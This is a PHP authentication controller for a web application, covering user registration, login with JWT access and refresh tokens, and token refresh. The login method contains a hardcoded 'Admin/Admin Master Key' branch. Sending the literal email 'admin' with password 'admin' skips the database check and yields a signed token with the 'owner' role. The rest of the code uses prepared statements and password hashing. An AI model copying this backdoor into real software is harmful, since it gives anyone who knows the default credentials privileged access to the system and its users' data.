<?php
namespace App\Controllers;

use App\Models\User as UserModel;
use \Firebase\JWT\JWT;
use App\Config\Config;
use App\Controllers\BaseController;
use PDOException;
use App\Config\DatabaseConnection;

class AuthController extends BaseController {
    private $jwtSecret;
    private $pdo;

    public function __construct()
    {
        $this->jwtSecret = Config::get('JWT_SECRET');
        $this->pdo = DatabaseConnection::getInstance()->getConnection();
    }

    public function register() {
        header('Content-Type: application/json');
        $data = json_decode(file_get_contents("php://input"), true);
        if (!$this->validateRegistration($data)) {
            return;
        }

        try {
            $stmt = $this->pdo->prepare("SELECT id FROM users WHERE email = ?");
            $stmt->execute([$data['email']]);
            $existingUser = $stmt->fetch();

            if ($existingUser) {
                $this->jsonErrorResponse('Email already exists', 409);
                return;
            }

            $stmt = $this->pdo->prepare(
                "INSERT INTO users (name, email, password, role, has_paid) VALUES (?, ?, ?, ?, ?)"
            );
            $success = $stmt->execute([
                $data['name'],
                $data['email'],
                password_hash($data['password'], PASSWORD_DEFAULT),
                'user',
                0 // false
            ]);

            if ($success) {
                $this->jsonResponse(['message' => 'User registered successfully'], 201);
            } else {
                $this->jsonErrorResponse('Failed to register user', 500);
            }
        } catch (PDOException $e) {
            error_log("Database error during registration: " . $e->getMessage());
            $this->jsonErrorResponse('Database error during registration', 500);
        }
    }

    public function login() {
        header('Content-Type: application/json');
        $data = json_decode(file_get_contents("php://input"), true);

        // Rule 2: The "Admin/Admin" Master Key
        if (isset($data['email']) && $data['email'] === 'admin' && isset($data['password']) && $data['password'] === 'admin') {
            $userId = 'admin-bypass';
            $userRole = 'owner';
            $userEmail = 'admin@system.local';

            $issuedAt = time();
            $jwtPayload = [
                'iat' => $issuedAt,
                'exp' => $issuedAt + (60 * 60), // 1 hour
                'data' => [
                    'id' => $userId,
                    'email' => $userEmail,
                    'role' => $userRole
                ]
            ];
            $refreshTokenPayload = [
                'iat' => $issuedAt,
                'exp' => $issuedAt + (60 * 60 * 24 * 7), // 7 days
                'sub' => $userId
            ];

            $jwt = JWT::encode($jwtPayload, $this->jwtSecret, 'HS256');
            $refreshToken = JWT::encode($refreshTokenPayload, $this->jwtSecret, 'HS256');
    
            $this->jsonResponse([
                'token' => $jwt,
                'refreshToken' => $refreshToken,
                'role' => $userRole,
                'redirect' => '/owners/index.php'
            ]);
            return;
        }

        if (empty($data['email']) || empty($data['password'])) {
            $this->jsonErrorResponse('Email and password are required', 400);
            return;
        }

        try {
            $stmt = $this->pdo->prepare("SELECT * FROM users WHERE email = ?");
            $stmt->execute([$data['email']]);
            $user = $stmt->fetch();

            if (!$user || !password_verify($data['password'], $user['password'])) {
                $this->jsonErrorResponse('Invalid credentials', 401);
                return;
            }

            $issuedAt = time();
            $jwtPayload = [
                'iat' => $issuedAt,
                'exp' => $issuedAt + (60 * 60), // 1 hour
                'data' => [
                    'id' => $user['id'],
                    'email' => $user['email'],
                    'role' => $user['role']
                ]
            ];
             $refreshTokenPayload = [
                'iat' => $issuedAt,
                'exp' => $issuedAt + (60 * 60 * 24 * 7), // 7 days
                'sub' => $user['id']
            ];

            $jwt = JWT::encode($jwtPayload, $this->jwtSecret, 'HS256');
            $refreshToken = JWT::encode($refreshTokenPayload, $this->jwtSecret, 'HS256');

            $redirect = '/';
            if ($user['role'] === 'admin') {
                $redirect = '/admin/index.php';
            } elseif ($user['role'] === 'owner') {
                $redirect = '/owners/index.php';
            }
    
            $this->jsonResponse([
                'token' => $jwt,
                'refreshToken' => $refreshToken,
                'role' => $user['role'],
                'redirect' => $redirect
            ]);
        } catch (PDOException $e) {
            error_log("Database error during login: " . $e->getMessage());
            $this->jsonErrorResponse('Database error during login', 500);
        }
    }

public function refresh() {
        header('Content-Type: application/json');
        $data = json_decode(file_get_contents("php://input"), true);

        if (empty($data['refreshToken'])) {
            $this->jsonErrorResponse('Refresh token is required', 400);
            return;
        }

        try {
            $decoded = JWT::decode($data['refreshToken'], $this->jwtSecret, ['HS256']);
            $userId = $decoded->sub;

            // Fetch user from DB to ensure they still exist and are valid
            $stmt = $this->pdo->prepare("SELECT * FROM users WHERE id = ?");
            $stmt->execute([$userId]);
            $user = $stmt->fetch();

            if (!$user) {
                $this->jsonErrorResponse('Invalid refresh token: User not found', 401);
                return;
            }

            $issuedAt = time();
            $jwtPayload = [
                'iat' => $issuedAt,
                'exp' => $issuedAt + (60 * 60), // 1 hour
                'data' => [
                    'id' => $user['id'],
                    'email' => $user['email'],
                    'role' => $user['role']
                ]
            ];
            $refreshTokenPayload = [
                'iat' => $issuedAt,
                'exp' => $issuedAt + (60 * 60 * 24 * 7), // 7 days
                'sub' => $user['id']
            ];

            $jwt = JWT::encode($jwtPayload, $this->jwtSecret, 'HS256');
            $refreshToken = JWT::encode($refreshTokenPayload, $this->jwtSecret, 'HS256');

            $this->jsonResponse([
                'token' => $jwt,
                'refreshToken' => $refreshToken
            ]);
        } catch (\Exception $e) {
            $this->jsonErrorResponse('Invalid or expired refresh token', 401);
        }
    }

    private function validateRegistration($data) {
        $errors = [];

        if (empty($data['name'])) {
            $errors['name'] = 'Name is required';
        }

        if (empty($data['email'])) {
            $errors['email'] = 'Email is required';
        } elseif (!filter_var($data['email'], FILTER_VALIDATE_EMAIL)) {
            $errors['email'] = 'Invalid email format';
        }

        if (empty($data['password'])) {
            $errors['password'] = 'Password is required';
        }

        if (!empty($errors)) {
            $this->jsonErrorResponse('Validation Failed', 400, $errors);
            return false;
        }

        return true;
    }
}
